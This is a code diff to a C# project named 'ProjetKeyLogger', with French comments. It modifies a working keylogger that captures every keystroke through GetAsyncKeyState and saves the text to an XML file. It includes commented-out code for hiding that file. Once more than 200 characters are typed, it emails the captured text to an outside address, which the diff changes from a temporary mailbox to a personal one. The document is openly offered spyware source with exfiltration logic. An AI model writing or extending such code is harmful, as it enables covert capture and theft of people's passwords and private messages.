@@ -14,6 +14,9 @@ namespace ProjetKeyLogger
 
         private string file_path;
 
+        //Initialisation du nombre de caractere tapé
+        private int nb_caractere_tape;
+
         public string File_Path
         {
             get
@@ -25,11 +28,15 @@ namespace ProjetKeyLogger
         //Constructeur(peut etre pas nécessaire)
         public KeyLogger()
         {
+            //initialisation du nombre de caractere
+            nb_caractere_tape = 0;
+
             //On initialise la collection
             collection_enregistrement = new CollectionEnregistrement();
 
             //Chemin pour enregistrer le fichier XML
             file_path = "../../../Fichier XML/TestXML.xml";
+
         }
 
         //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
@@ -45,10 +52,6 @@ namespace ProjetKeyLogger
         {
             //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
             Enregistrement enregistrement = new Enregistrement();
-
-            //Initialisation du nombre de caractere tapé
-            int nb_caractere_tape = 0;
-
             //capture les frappes de touches et les afficher dans la console
             bool majuscule = false;
             bool shift = false;
@@ -72,7 +75,7 @@ namespace ProjetKeyLogger
                 {
                     //Si la touche est enfoncée on suspend l'autorisation de saisie du texte
                     int statut_cle = GetAsyncKeyState(list_non_accepte[i]);
-                    if (statut_cle == 32769) { autorise_saisie = false;  }
+                    if (statut_cle == 32769) { autorise_saisie = false; }
                 }
                 
                 //verification de l'état de chaque touche (up ou down)
@@ -89,7 +92,7 @@ namespace ProjetKeyLogger
                         string valeurs;
                         switch (codeASCII)
                         {
-                            
+
                             //Si touche Entrée
                             case 13:
                                 //Sinon on peut faire un console.writeline tout simplement ?
@@ -109,7 +112,8 @@ namespace ProjetKeyLogger
                                 if (majuscule == false)
                                 {
                                     majuscule = true;
-                                } else
+                                }
+                                else
                                 {
                                     majuscule = false;
                                 }
@@ -346,31 +350,28 @@ namespace ProjetKeyLogger
                                 break;
                         }
 
-                       
-                        //Si plus de 100 caracteres ont été tapé
-                        if (nb_caractere_tape > 100)
-                        {
-                            //On enregistre le contenue en xml
-                            collection_enregistrement.saveToXml(file_path);
+                    }
+                    if (nb_caractere_tape > 200)
+                    {
+                        //On enregistre le contenue en xml
+                        collection_enregistrement.saveToXml(file_path);
 
-                            //on cache le xml
-                          //  File.SetAttributes(file_path, FileAttributes.Hidden);
-                            //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case
-
-
-                            //On reinitialise le nombre de caracteres
-                            nb_caractere_tape = 0;
-
-                            //On réinitialise la collection
-                            collection_enregistrement = new CollectionEnregistrement();
-
-                            //Puis on envoie un mail
-                            envoieMail();
-                        }
+                        //on cache le xml
+                        //  File.SetAttributes(file_path, FileAttributes.Hidden);
+                        //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case
 
 
+                        //On reinitialise le nombre de caracteres
+                        nb_caractere_tape = 0;
+
+                        //On réinitialise la collection
+                        collection_enregistrement = new CollectionEnregistrement();
+
+                        //envoie du mail
+                        envoieMail();
                     }
                 }
+
             }
         }
 
@@ -408,7 +409,7 @@ namespace ProjetKeyLogger
             //definition de l'adresse de destination 
             //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
             //site de création du mail : temp-mail.org
-            Message_Mail.To.Add("jejarer632@nonicamy.com");
+            Message_Mail.To.Add("ccamenen@outlook.fr");
 
             //defition de l'objet du mail
             Message_Mail.Subject = Objet_Mail;
@@ -428,6 +429,7 @@ namespace ProjetKeyLogger
             //Envoie du message
             Client.Send(Message_Mail);
 
+            Console.WriteLine("Email envoyé");
         }
 
 
